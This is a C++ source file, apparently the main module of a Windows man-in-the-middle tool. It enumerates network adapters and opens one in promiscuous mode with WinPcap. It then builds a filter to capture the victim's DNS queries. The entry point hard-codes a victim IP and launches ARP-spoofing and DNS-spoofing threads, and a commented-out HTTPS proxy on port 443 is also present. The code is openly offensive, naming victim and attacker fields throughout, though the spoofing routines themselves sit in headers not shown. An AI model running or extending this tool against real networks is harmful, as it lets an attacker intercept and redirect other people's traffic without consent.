#include "main.h"
#include "arp.h"
#include "dns.h"
#include "proxy.h"

Basic::Basic()
{
	_victim_addr = NULL;
	_attack_host = NULL;
	memset(&info, 0, sizeof(Info));
	head_list = NULL;
	tail_list = NULL;
	work_list = NULL;
}

Basic::Basic(const char* _vaddr, const char* host)
{
	_victim_addr = (char*)_vaddr;
	_attack_host = (char*)host;
	memset(&info, 0, sizeof(Info));
	head_list = NULL;
	tail_list = NULL;
	work_list = NULL;
	set_ip(_vaddr, info.victim_ip);
}

Basic::~Basic()
{

}

bool Basic::_init()
{
	if (!get_adapters())
	{
		fprintf(stderr, "\n [!] get_adapters() Error...\n");
		return false;
	}

	int input_adapter;
	fprintf(stdout, " Enter the interface number : ");
	scanf_s("%d", &input_adapter);

	if (!open_adapter(input_adapter))
	{
		fprintf(stderr, "\n [!] open_adapter() Error...\n");
		return false;
	}

	fprintf(stdout, " ARP Spoofing Handle : 0x%x\n", info.arp_handle);
	fprintf(stdout, " DNS Spoofing Handle : 0x%x\n", info.dns_handle);
	return true;
}

bool Basic::get_adapters()
{
	DWORD dwRet;
	PIP_ADAPTER_ADDRESSES pAdpAddrs;
	PIP_ADAPTER_ADDRESSES tmp;
	unsigned long ulBufLen = sizeof(IP_ADAPTER_ADDRESSES);

	pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);
	if (!pAdpAddrs) return false;
	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet == ERROR_BUFFER_OVERFLOW)
	{
		free(pAdpAddrs);
		pAdpAddrs = (PIP_ADAPTER_ADDRESSES)malloc(ulBufLen);

		if (!pAdpAddrs)
			return false;
	}

	dwRet = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_GATEWAYS, NULL, pAdpAddrs, &ulBufLen);
	if (dwRet != NO_ERROR)
	{
		free(pAdpAddrs);
		return false;
	}

	for (tmp = pAdpAddrs; tmp != NULL; tmp = tmp->Next)
	{
		if (print_adapters(tmp))
		{
			if (!insert_adapters_iist(tmp))
				return false;
		}
	}
	return true;
}

bool Basic::print_adapters(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int count = 0;
	char fname_buf[BUFSIZ] = { 0 };
	char dname_buf[BUFSIZ] = { 0 };

	if (tmp->OperStatus == IfOperStatusUp)
	{
		WideCharToMultiByte(CP_ACP, 0, tmp->FriendlyName, wcslen(tmp->FriendlyName), fname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, " %d) Adapter OS Name : %s \n", ++count, fname_buf);
		fprintf(stdout, "    Adapter Interface : %s \n", tmp->AdapterName);

		WideCharToMultiByte(CP_ACP, 0, tmp->Description, wcslen(tmp->Description), dname_buf, BUFSIZ, NULL, NULL);
		fprintf(stdout, "    Adapter Name : %s \n", dname_buf);

		for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
			fprintf(stdout, "    Adapter IP : %s\n", inet_ntoa(pAddr->sin_addr));
		}

		fprintf(stdout, "    Adapter MAC : ");
		for (int i = 0; i < ETH_LEN; i++)
		{
			fprintf(stdout, "%.2x", tmp->PhysicalAddress[i]);
			if (i != 5)
				fprintf(stdout, ":");
		}
		fprintf(stdout, "\n    Gateway IP : ");
		for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
		{
			struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
			fprintf(stdout, "%s", inet_ntoa(pAddr->sin_addr));

		}
		fprintf(stdout, "\n\n");
		return true;
	}
	return false;
}

bool Basic::insert_adapters_iist(PIP_ADAPTER_ADDRESSES tmp)
{
	PIP_ADAPTER_UNICAST_ADDRESS pThisAddrs;
	PIP_ADAPTER_GATEWAY_ADDRESS pGateAddrs;

	static int number = 0;
	work_list = (Adapter_list*)malloc(sizeof(Adapter_list));
	if (work_list == NULL)
	{
		fprintf(stderr, "malloc() error...\n");
		return false;
	}
	work_list->number = ++number;
	work_list->interfaceName = tmp->AdapterName;
	work_list->FriendlyName = tmp->FriendlyName;
	work_list->adapterName = tmp->Description;

	for (int i = 0; i < ETH_LEN; i++)
		work_list->mac_addr[i] = tmp->PhysicalAddress[i];
	for (pThisAddrs = tmp->FirstUnicastAddress; NULL != pThisAddrs; pThisAddrs = pThisAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pThisAddrs->Address.lpSockaddr;
		work_list->ip_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	for (pGateAddrs = tmp->FirstGatewayAddress; NULL != pGateAddrs; pGateAddrs = pGateAddrs->Next)
	{
		struct sockaddr_in* pAddr = (struct sockaddr_in*)pGateAddrs->Address.lpSockaddr;
		work_list->gate_addr = htonl(inet_addr(inet_ntoa(pAddr->sin_addr)));
	}

	work_list->next = NULL;

	if (head_list == NULL)
	{
		head_list = work_list;
		tail_list = work_list;
		return true;
	}

	tail_list->next = work_list;
	tail_list = work_list;

	return true;
}

bool Basic::open_adapter(int _inum)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	int i;
	char name[1000] = "\\Device\\NPF_";

	work_list = head_list;

	for (i = 1; i <= _inum; i++)
	{
		if (work_list->number == _inum)
			break;
		work_list = work_list->next;
	}

	strcat(name, work_list->interfaceName);

	for (i = 0; i < ETH_LEN; i++)
		info.attacker_mac[i] = work_list->mac_addr[i];

	for (int i = 0; i < IP_LEN; i++)
	{
		info.attacker_ip[i] = ((uint8_t*)&work_list->ip_addr)[3 - i];
		info.gateway_ip[i] = ((uint8_t*)&work_list->gate_addr)[3 - i];
	}

	info.arp_handle = pcap_open(name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1, NULL, errbuf);
	if (info.arp_handle == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", name);
		return false;
	}

	info.dns_handle = pcap_open(name, 128, PCAP_OPENFLAG_PROMISCUOUS, 512, NULL, errbuf);
	if (info.arp_handle == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", name);
		return false;
	}

	char dns_filter[1024] = { 0 };
	snprintf(dns_filter, sizeof(dns_filter), "udp and dst port 53 and not src %u.%u.%u.%u", info.attacker_ip[0], info.attacker_ip[1], info.attacker_ip[2], info.attacker_ip[3]);
	printf(" DNS filter : %s\n", dns_filter);

	u_int net, mask;
	if (pcap_lookupnet(name, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, " [!] Error : pcap_lookupnet() %s\n", errbuf);
		return false;
	}

	struct bpf_program fcode;
	if (pcap_compile(info.dns_handle, &fcode, dns_filter, 1, mask) < 0)
	{
		pcap_perror(info.dns_handle, (char*)"pcap_compile");
		return false;
	}

	if (pcap_setfilter(info.dns_handle, &fcode) == -1)
	{
		pcap_perror(info.dns_handle, (char*)"pcap_setfilter");
		return false;
	}

	return true;
}

void Basic::set_ip(_In_ const char* _src, _Inout_ uint8_t* _dst)
{
	uint32_t temp = htonl(inet_addr(_src));
	for (int i = 0; i < IP_LEN; i++)
		_dst[i] = ((uint8_t*)&temp)[3 - i];
}

int main(int agrc, char* argv[])
{
	Dns dns;
	dns._init();
	dns.set_ip("192.168.42.30", dns.info.victim_ip);
	dns.arp_init();
	dns.arp_thread();
	dns.dns_thread();

	//CSERVER proxy(443);
	//proxy.proxy_thread();

	fprintf(stdout, "\n Shutdown, press the [esc] key..\n");
	while (1)
		if (getch() == 27)
			exit(0);

	return 0;
}

